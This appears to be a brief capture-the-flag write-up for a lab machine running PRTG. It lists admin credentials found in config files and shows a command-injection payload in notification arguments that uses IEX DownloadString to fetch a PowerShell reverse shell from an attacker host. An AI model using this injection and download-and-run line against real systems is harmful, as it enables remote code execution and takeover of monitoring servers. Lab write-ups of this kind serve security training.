![logo](./logo.png)

10.10.10.152

# USER

FTP server exposes the entire machines directory. This gives us the ```user.txt```

# ROOT

Looking in the PRTG config files I found some credentials

```
prtgadmin
PrTg@dmin2018
```

The login did not work initially but changing the date to:

```
PrTg@dmin2019
```

Looking at the demo scripts for notifications it looks like the arguments are not sanitised
https://www.codewatch.org/blog/?p=453

Reverse shell
```
test.txt; IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.55:8000/shell.ps1")
```

Getting the reverse shell gives us administrator and the flag